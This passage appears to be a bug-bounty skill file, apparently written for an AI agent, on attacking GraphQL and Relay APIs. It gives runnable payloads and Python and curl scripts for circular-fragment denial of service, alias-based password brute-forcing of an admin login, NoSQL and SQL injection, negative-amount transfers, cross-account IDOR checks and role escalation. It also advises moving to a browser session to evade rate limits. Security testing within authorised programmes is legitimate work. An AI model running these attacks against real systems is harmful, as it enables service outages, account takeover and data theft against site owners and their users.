        r2 = requests.get(f"https://target.com{ep}?query={{__schema{types{name}}}}")
        if "__schema" in r2.text:
            print(f"  → Introspection via GET!")
```

### 12. Circular Fragment DoS

GraphQL fragments can reference each other recursively. If the server doesn't detect circular references, the query causes infinite recursion → CPU exhaustion → DoS.

**Payload — Self-referencing fragment:**
```graphql
fragment F on User { ...F }
query { user(id: 1) { ...F } }
```

**Payload — Mutually recursive fragments:**
```graphql
fragment A on User { ...B }
fragment B on User { ...A }
query { user(id: 1) { ...A } }
```

**Payload — Deep circular via nested types:**
```graphql
fragment Loop on Organization { users { ...Loop } }
query { organization(id: 1) { ...Loop } }
```

**Python tester:**
```python
import requests, json, time

# Circular fragment DoS
payloads = [
    "fragment F on User { ...F } query { user(id:1) { ...F } }",
    "fragment A on User { ...B } fragment B on User { ...A } query { user(id:1) { ...A } }",
]

for q in payloads:
    start = time.time()
    try:
        r = requests.post("https://target.com/graphql",
            json={"query": q}, timeout=30)
        elapsed = time.time() - start
        if elapsed > 10:
            print(f"🚨 DoS potential: {elapsed:.1f}s for circular fragment")
    except requests.Timeout:
        print(f"🚨🚨 TIMEOUT — server hung on circular fragment!")
```

### 13. Alias-based Data Duplication

GraphQL aliases let you request the **same field** with **different arguments** in a single query. Use this for:
- Brute-forcing IDs without rate limiting
- Checking multiple conditions simultaneously
- Bypassing per-query restrictions

**Password/secret brute-force:**
```graphql
mutation {
  a1: login(email:"admin@target.com", password:"password1") { token }
  a2: login(email:"admin@target.com", password:"password2") { token }
  a3: login(email:"admin@target.com", password:"password3") { token }
  a4: login(email:"admin@target.com", password:"password4") { token }
  a5: login(email:"admin@target.com", password:"password5") { token }
}
```

**ID enumeration with alias:**
```graphql
query {
  u1: user(id: 1) { id email role }
  u2: user(id: 2) { id email role }
  u3: user(id: 3) { id email role }
  # ... all in one request, no rate limit!
}
```

**Dual-condition trick (bypass if/else logic):**
```graphql
query {
  if_true: user(id: 1, condition: true) { secret }
  if_false: user(id: 1, condition: false) { secret }
}
```
If one returns data and the other returns error/null, you've found a logic flaw.

### 14. Error-based Information Leak

GraphQL errors often leak sensitive information in the `errors` array. Every error message is a potential data source.

**Common error leak points:**
```graphql
# 1. Invalid argument type → stack trace
query { user(id: "not_an_int") { email } }

# 2. Missing required field → validation details
query { user { } }

# 3. Invalid enum value → valid enum values revealed
mutation { updateUser(role: "INVALID_ROLE") { id } }
# → "Expected type Role, found INVALID_ROLE; Did you mean: ADMIN, USER, MODERATOR?"

# 4. Field does not exist → suggestions reveal real field names
query { user(id: 1) { nonexistentField } }
# → "Cannot query field 'nonexistentField' on type 'User'. Did you mean 'email'?"

# 5. SQL/DB error → internal paths, table names
# → "SQLSTATE[42S22]: Column not found: 1054 Unknown column 'secret_field'"
```

**Automated error extraction:**
```python
import requests, json

def probe_errors(endpoint, token):
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    probes = [
        'query { user(id: "x") { id } }',
        'query { user(id: 1) { __typename } }',  # baseline
        'query { nonexistentQuery { id } }',
        'mutation { }',
        'query { user(id: 1) { nonexistent } }',
        '{"query":"query","variables":null}',
        'query { user(id: 1) { password } }',  # field may exist but be hidden
    ]
    
    for q in probes:
        r = requests.post(endpoint, json={"query": q}, headers=headers, timeout=10)
        data = r.json()
        if 'errors' in data:
            for err in data['errors']:
                msg = err.get('message', '')
                if any(kw in msg.lower() for kw in ['password', 'secret', 'token', 'sql', 'stack', 'internal', 'debug', '/var/', '/app', 'sensitive']):
                    print(f"🔴 LEAK: {msg[:200]}")
                else:
                    print(f"🟡 Error: {msg[:100]}")
```

### 15. Union/Interface Type Probing

GraphQL `union` and `interface` types use `__typename` to distinguish concrete types. You can probe for undocumented types that shouldn't be accessible.

**Union type probing:**
```graphql
query {
  search(term: "test") {
    __typename
    ... on User { email privateKey }
    ... on Admin { secretToken }
    ... on InternalNote { content }
    ... on PaymentMethod { cardNumber }
    ... on Credential { password }
  }
}
```
If any `... on Type` returns data instead of null, you've found an accessible type that shouldn't be.

**Interface probing with inline fragments:**
```graphql
query {
  node(id: "SOME_ID") {
    __typename
    ... on User { id email }
    ... on Account { balance }
    ... on AdminPanel { internalEndpoint }
  }
}
```

**Brute-force type discovery:**
```python
common_types = ["User", "Admin", "Account", "Payment", "PaymentMethod",
    "InternalNote", "Secret", "Credential", "ApiKey", "Token",
    "PrivateKey", "Server", "Config", "Setting", "Permission",
    "Role", "Session", "Log", "Audit", "Backup"]

for t in common_types:
    q = f'query {{ __type(name:"{t}") {{ name fields {{ name }} }} }}'
    r = requests.post(url, json={"query": q}, headers=headers)
    if r.json().get('data',{}).get('__type'):
        print(f"🔴 Type exists: {t}")
```

### 16. Input Validation Bypass (Type Coercion)

GraphQL has strong typing, but type coercion can behave unexpectedly. Send unexpected types to trigger errors or bypass validation.

**Integer → Boolean coercion:**
```graphql
# If a field expects Boolean but accepts 1/0:
mutation { deleteUser(id: 1, confirm: 1) { success } }
mutation { deleteUser(id: 1, confirm: "true") { success } }
```

**String → Enum coercion:**
```graphql
# Enums may accept string values that aren't in the enum definition
mutation { setRole(userId: 1, role: "superadmin") { id } }
mutation { setRole(userId: 1, role: "") { id } }
mutation { setRole(userId: 1, role: null) { id } }
```

**Array → Scalar coercion:**
```graphql
# If a field expects String but you send [String]:
query { user(id: [1, 2, 3]) { email } }
# Some resolvers process ALL values in the array!
```

**JSON injection in variables:**
```graphql
# If variables are passed to SQL/NoSQL queries
query($id: ID!) { user(id: $id) { email } }
# variables: {"id": {"$ne": null}}  → MongoDB NoSQL injection!
# variables: {"id": "1 OR 1=1"}     → SQL injection
```

**Numeric overflow/underflow:**
```graphql
query { products(first: 999999999999) { ... } }  # overflow
query { products(first: -1) { ... } }             # negative → all records? (Shopify $1k!)
mutation { transfer(amount: -1000) { balance } }  # negative transfer → steal money
```

**Disclosed reports:**
- **[H1 #481518](https://hackerone.com/reports/481518)** — Shopify: negative `first` caused negative query cost → rate limit bypass ($1,000)
- **[H1 #1691463](https://hackerone.com/reports/1691463)** — Type coercion: sending float where Int expected → IDOR bypass
- Root cause: GraphQL type coercion doesn't sanitize — `1.0` → `1`, `"true"` → `true`, `["x"]` → `x`

---

## Missing Techniques Checklist — 16 Techniques

Use this checklist during every GraphQL hunt to ensure complete coverage:

- [ ] **1. Endpoint Discovery** — /graphql, /graphiql, /playground, /altair
- [ ] **2. Shadow API Discovery** — grep schema for admin/internal mutations
- [ ] **3. Single-Packet Race** — alias batching + HTTP/2 race window
- [ ] **4. Rate Limit Bypass** — aliases, array, negative cost, APQ hash
- [ ] **5. Dual-Write Desync** — REST + GraphQL state confusion
- [ ] **6. GET-based CSRF** — query params in GET, `<img>` exfil
- [ ] **7. Batching User Enum** — alias array for mass ID check
- [ ] **8. Subscription Hijack** — WebSocket auth bypass
- [ ] **9. Pagination Dump** — cursor-based mass extraction
- [ ] **10. APQ Bypass** — hash+query piggyback on whitelist
- [ ] **11. GET Introspection** — GET-based schema extraction
- [ ] **12. Circular Fragment DoS** — recursive fragment → CPU bomb
- [ ] **13. Alias Data Duplication** — brute-force with aliases
- [ ] **14. Error Leak** — schema, types, SQL from errors
- [ ] **15. Union/Interface Probing** — `__typename` + `...on Type`
- [ ] **16. Type Coercion Bypass** — int→bool, string→enum, array→scalar
- [ ] Introspection — `__schema`, `__typename`, field suggestion bypass
- [ ] IDOR via Node ID — base64 decode GID, swap IDs cross-account
- [ ] Mutation Auth Bypass — test unscoped mutations, cross-tenant
- [ ] SSRF via Argument — URL args that server dereferences
- [ ] Batched Queries DoS — array batching, depth-bomb, negative cost
- [ ] SQLi via Argument — NoSQL/SQL injection in variables
- [ ] Alias Batching — N aliases for rate limit bypass / race

---



## Content from local version



## PHASE 1: Detect Relay GraphQL

Signals: Response IDs like `"Vmlld2VyOjkyNDU="` (base64), `node(id:"...")` queries, `viewer` root query, `edges { node { ... } }` pagination.

```bash
curl -sk "https://api.target.com/graphql" -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"query { viewer { id } }"}'
```



## 🎯 When to Use This Skill

The target is a React SPA (likely CRA or Next.js) that:
- Uses **Relay** as its GraphQL client (look for `graphql`\`...\`` tagged templates in source)
- Has **source maps accessible** at `main.xxxxxx.js.map` (check HTTP 200)
- Has **two accounts** (or can create them)
- Has a **GraphQL endpoint** that accepts Relay queries

The technique is specifically for **Relay-based** apps because:
1. Relay embeds ALL operations as string literals in the JS bundle
2. Source maps contain the original source files with the full operation bodies
3. No need to reverse-engineer — the exact queries/mutations are right there




## PHASE 5: Cross-Account Node IDOR

```python
import json, urllib.request
ids = []  # from token A
tok_b = "TOKEN_B"
for rid in ids:
    req = urllib.request.Request("https://api.target.com/graphql",
        data=json.dumps({"query": f'query {{ node(id: "{rid}") {{ id __typename }} }}'}).encode(),
        headers={"Content-Type":"application/json","Authorization":f"Bearer {tok_b}"})
    r = json.loads(urllib.request.urlopen(req).read())
    tn = r.get('data',{}).get('node',{}).get('__typename','❌')
    print(f"{'🚨IDOR' if tn!='❌' else '✅OK'} {rid[:30]} → {tn}")
```



## PHASE 4: env.js Discovery

```bash
curl -sk "https://target.com/env.js"  # subdomains, API URL, keys
```



## 🔴 Pitfalls

1. **Token expiry**: Refresh every 10 min. Do 30 ops, refresh, continue.
2. **Rate limiting**: Add `time.sleep(0.1)` between calls.
3. **Same vs different data**: Strip IDs before comparing. Only ID diffs = expected.
4. **Fragments**: Skip them — can't run standalone.
5. **node() cross-account "Not found"**: Expected on well-scoped systems. Not a finding.
6. **Permission profiles via node()**: Use `viewer { permissionProfiles }` — node() won't work.

## PHASE 3: Source Map GQL Extraction

```python
import json, re
with open('main.js.map') as f:
    d = json.loads(f.read())
for src in d.get('sourcesContent', []):
    if not src: continue
    for g in re.findall(r'graphql`([^`]+)`', str(src), re.DOTALL):
        if 'query' in g.lower() or 'mutation' in g.lower():
            print(g.strip()[:500])
```



## 🟠 PITFALL: Rate Limiting — Switch to Browser

**When Python/curl scripts start returning HTTP 403 on every request**, you are almost certainly rate-limited on the Bearer token endpoint. The browser-based session (cookie auth) has a different rate-limit bucket.

### Symptoms
- All script calls return 403 regardless of query
- Browser session works fine (dashboard loads, GraphQL calls succeed)
- JWT tokens are still valid (not expired yet)

### The Fix: Switch to Playwright Browser

Instead of fighting rate limits through curl, switch to browser-based testing:

```python
# 1. Login in browser
page.goto("https://target.com")
page.fill('input[type="email"]', USER_EMAIL)
page.fill('input[type="password"]', USER_PASSWORD)
page.click('button:has-text("Sign in")')

# 2. The browser maintains its own cookie session (separate from Bearer token)
# 3. Use browser_run_code_unsafe for complex JS operations
# 4. Use browser_network_requests to capture actual GraphQL calls

# 5. When ref matching fails on interactive elements:
await page.locator('table tbody tr').last().locator('button').first().click()
```

### Why This Works
Cookie-based auth often has separate rate-limiting from Bearer/JWT token auth. The session cookie goes through a different middleware pipeline that may not count against the same rate limit counter as API tokens.

### Browser Limitations
- Cannot easily write raw GraphQL queries from console (SameSite cookies restrict cross-origin)
- Use the browser's existing session + navigate UI to trigger operations
- Capture network requests via `browser_network_request(part="request-body")`



## Step 2: Extract ALL Operations (Python)

```python
import json, re

with open('main.js.map', 'r') as f:
    smap = json.loads(f.read())

operations = []
seen = set()

for src in smap.get('sourcesContent', []):
    if not src:
        continue
    s = str(src)
    
    # The core pattern: Relay uses graphql`...` tagged template literals
    for m in re.finditer(r'graphql`([^`]+)`', s, re.DOTALL):
        body = m.group(1).strip()
        op_match = re.match(r'(query|mutation|subscription)\s+(\w+)', body)
        if op_match:
            op_type = op_match.group(1)
            op_name = op_match.group(2)
            if op_name not in seen:
                seen.add(op_name)
                operations.append({
                    'type': op_type,
                    'name': op_name,
                    'body': body,
                    'vars': dict(re.findall(r'\$(\w+):\s*([\w!\[\]]+)', body))
                })

print(f"Extracted {len(operations)} operations")
queries = [op for op in operations if op['type'] == 'query']
mutations = [op for op in operations if op['type'] == 'mutation']
print(f"  Queries: {len(queries)}")
print(f"  Mutations: {len(mutations)}")
```




## PHASE 6: Mutation BAC

Get lockVersion → cross-test: `minorUpdateEvent`, `updateEvent`, `updateEventState`, `deleteNode`, `duplicateEvent`, `inviteUser`.



## Step 4: Run with Two Accounts

```python
import urllib.request, json, re, time

def gql(token, payload):
    headers = {"Content-Type":"application/json","Authorization":"Bearer "+token,"Origin":"https://target.com"}
    req = urllib.request.Request("https://api.target.com/graphql", data=json.dumps(payload).encode(), headers=headers, method="POST")
    return json.loads(urllib.request.urlopen(req, timeout=20).read())

for op in operations:
    payload = {"query": op['body'], "variables": build_vars(op)}
    r_a = gql(TOKEN_A, payload); time.sleep(0.1)
    r_b = gql(TOKEN_B, payload); time.sleep(0.1)
    
    a_ok = r_a.get('data') and not r_a.get('errors')
    b_ok = r_b.get('data') and not r_b.get('errors')
    a_str = json.dumps(r_a.get('data'), sort_keys=True, default=str)
    b_str = json.dumps(r_b.get('data'), sort_keys=True, default=str)
    
    if a_ok and b_ok and a_str != b_str:
        a_clean = re.sub(r'"id":"[^"]+"', '', a_str)
        b_clean = re.sub(r'"id":"[^"]+"', '', b_str)
        if a_clean != b_clean:
            print(f"🔴 DATA DIFF: {op['name']}")
    elif a_ok and not b_ok:
        print(f"🟠 A_ONLY: {op['name']}")
```




## PHASE 2: Decode/Encode Relay IDs

```bash
echo "Vmlld2VyOjk0MzU=" | base64 -d  # → Viewer:9435
python3 -c "import base64; print(base64.b64encode(b'Event:59164').decode())"
# Types: Viewer, Account, Event, Venue, Artist, User, Promoter
```



## PHASE 8: CORS + GET GraphQL

```bash
curl -sk "https://api.target.com/graphql?query=query{viewer{id}}" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Origin: https://evil.com" -I | grep -i access-control
```



## PHASE 7: Permission Profile Management & Role-Based BAC

Relay GraphQL platforms often have a **permission profile system** where users are assigned profiles that define CRUD permissions on resources. Test role-based access control by creating different profiles and assigning users.

### Step 1: Discover Existing Profiles

```graphql
query { viewer { permissionProfiles { id caption roleName subjects { name actions { name } } } } }
```

Common profile types found on staging platforms:
| ID | roleName | Permissions |
|----|----------|-------------|
| 14 | `client_read_only` | read_doorlist, read_seatmap, download_doorlist |
| 18 | `client_admin` | full CRUD on events, account management, finance |
| 19 | `box_office_agent` | read_seatmap, read_doorlist, download_doorlist |
| 11-21 | various | Marketing, Finance, Manage Only, Bar Manager |

### Step 2: Create Custom Permission Profiles

```bash
# Minimal profile (no permissions):
curl -sk "$API/graphql" -X POST -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { createPermissionProfile(input: {clientMutationId: \"r1\", caption: \"Restricted\"}) { permissionProfile { id caption roleName } } }"}'

# Profile WITH subjects and actions (ActionInput format: {name: "actionName"}):
curl -sk "$API/graphql" -X POST -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { createPermissionProfile(input: {clientMutationId: \"r2\", caption: \"Read Only Events\", subjects: [{name: \"event\", actions: [{name: \"read_doorlist\"}]}]}) { permissionProfile { id caption roleName subjects { name actions { name } } } } }"}'
```

**CRITICAL:** The `subjects` field in `createPermissionProfile` uses `ActionInput` format:
```json
subjects: [{name: "event", actions: [{name: "read_doorlist"}, {name: "read_seatmap"}]}]
```
NOT string arrays (`actions: ["read_doorlist"]`).

### Step 3: Invite Users with Different Profiles

```bash
# Invite user with restricted profile (id 14):
curl -sk "$API/graphql" -X POST -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"mutation { inviteUser(input: {clientMutationId: \"i1\", accountId: \"QWNjb3VudDoxNDE3Ng==\", email: \"test@test.com\", permissionProfileId: \"UGVybWlzc2lvblByb2ZpbGU6MTQ=\"}) { successful messages { code field message } } }"}'
```

InviteUserInput format: `{ accountId, clientMutationId, email, permissionProfileId }`

### Step 4: Cross-Role BAC Tests

After creating users with different profiles:
1. **Login as the restricted user** → get their token
2. **Replay attacker's queries** with the restricted token
3. **Check for privilege escalation**: Can a read_only user update events?
4. **Check for IDOR**: Can a user with profile X access resources owned by another user?

Expected outcomes:
- Restricted profile should get errors on write operations
- Both profiles should see same shared data (venues, artists, tags)
- Admin profile should succeed where restricted fails



## PHASE 8: Batch

```bash
curl -sk "https://api.target.com/graphql/batch" -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -d '[{"query":"query{viewer{id}}"},{"query":"query{viewer{account{id}}}"}]'
```

### Crossing the AC Signals
Not found on node() = AC working (resource exists but NOT yours).
Not enough permissions = AC working (resource found but action denied).
null response without error = possible SPA/Relay wrapper — still properly scoped.
**Do NOT report these as bugs.**

### Account Enumeration via node()
Own account → data.  Other's account → Not found.  Non-existent → Not found.
Cannot distinguish on single query.  Pair with `inviteUser` error messages.

### Global Shared Resources
Artists, Venues, Tags, Characteristics, Product Categories are often GLOBAL.
Both accounts see identical list = by design, NOT an IDOR.

### Global Shared Resources — Decision Table

| Resource | Both see same data? | Bug? |
|----------|--------------------|------|
| Artists, Venues, Tags | Yes (global) | ❌ By design |
| Events, Accounts, Promoters | Each sees own | ✅ Properly scoped |

Always fetch `lockVersion` before mutation tests. Always pass `clientMutationId`. 
Sequential Account/User IDs (14176, 14177) are common — the AC is in the resolver, not the ID space.

---
# Merged from: relay-graphql-bulk-scanner

# Relay GraphQL Bulk Scanner — Source Map Extraction + Two-Account Testing

